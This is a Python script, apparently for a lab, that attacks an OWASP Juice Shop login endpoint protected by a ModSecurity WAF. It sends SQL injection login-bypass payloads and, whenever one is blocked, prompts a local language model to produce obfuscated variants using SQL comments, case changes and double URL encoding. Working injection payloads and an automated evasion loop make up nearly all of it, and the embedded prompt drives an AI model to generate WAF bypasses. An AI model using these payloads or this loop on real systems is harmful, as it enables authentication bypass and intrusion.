import requests
import json
import subprocess
import time
import re  # Import necessário para o regex
from ollama import Client

TARGET_URL = "http://defense-waf:8080/rest/user/login"
client = Client(host="http://metatron_llm:11434")

def extract_latest_waf_log():
    """Simula a percepção de bloqueio da regra 942100"""
    return "Regra 942100: SQL Injection Attack Detected via libinjection (Padrão: String+Comment)"

def ask_metatron_evasion(blocked_payload, waf_reason):
    print(f"\n[!] Re-calibrando Metatron para OFUSCAÇÃO agressiva...")
    prompt = f"""
    [CRITICAL] Your previous attempt "{blocked_payload}" was BLOCKED by ModSecurity ({waf_reason}).
    [GOAL] You MUST maintain the SQL Injection logic (' OR 1=1 --) but bypass the WAF detection.
    
    [STRATEGY] Apply one of these:
    1. SQL Comments: admin@juice-sh.op'/**/OR/**/1=1/**/--
    2. URL Double Encoding: admin@juice-sh.op'%2527%2520OR%25201=1%2520--
    3. Case variation + Comments: admin@juice-sh.op'/**/oR/**/1=1/**/--
    
    [RULE] Return ONLY the raw JSON. DO NOT remove the injection.
    [FORMAT] {{"email": "modified_payload", "password": "foo"}}
    [TECHNIQUE] Use valid SQLite comments: admin@juice-sh.op'/**/OR/**/1=1/**/--
    [CRITICAL] Ensure the payload ends with double dashes '--' to comment out the rest of the query.
    """

    response = client.generate(
        model='qwen2.5-coder:1.5b',
        prompt=prompt,
        stream=False
    )
    return response['response'].strip()

def run_evasion_loop():
    print("[*] Iniciando Loop de Evasão de WAF (Adversarial ML)...")

    current_payload = "admin@juice-sh.op'--"

    for attempt in range(1, 4):
        print(f"\n--- Tentativa {attempt} ---")
        print(f"[*] Injetando: {current_payload}")

        try:
            # Payload montado antes do disparo
            payload_json = {"email": current_payload, "password": "foo"}
            res = requests.post(TARGET_URL, json=payload_json, timeout=10)
            print(f"[*] Resposta do Servidor: {res.status_code}")

            if res.status_code == 200:
                print("\n[!!!] EVASÃO BEM SUCEDIDA: O WAF foi contornado.")
                return
            elif res.status_code == 403:
                print("[-] Bloqueado pelo WAF (Status 403).")

                waf_log = extract_latest_waf_log()
                new_advice = ask_metatron_evasion(current_payload, waf_log)

                try:
                    # Limpeza de markdown e extração de JSON via Regex
                    clean_advice = new_advice.replace("```json", "").replace("```", "").strip()
                    match = re.search(r'\{.*\}', clean_advice, re.DOTALL)
                    if match:
                        new_payload_json = json.loads(match.group(0))
                        current_payload = new_payload_json.get("email", current_payload)
                    else:
                        raise ValueError("JSON não encontrado no output")
                except (json.JSONDecodeError, ValueError):
                    print("[-] IA falhou no formato. Aplicando mutação de fallback (Double Encoding)...")
                    current_payload = "admin@juice-sh.op%2527--"

        except Exception as e:
            print(f"[-] Erro crítico de execução: {e}")

if __name__ == "__main__":
    run_evasion_loop()
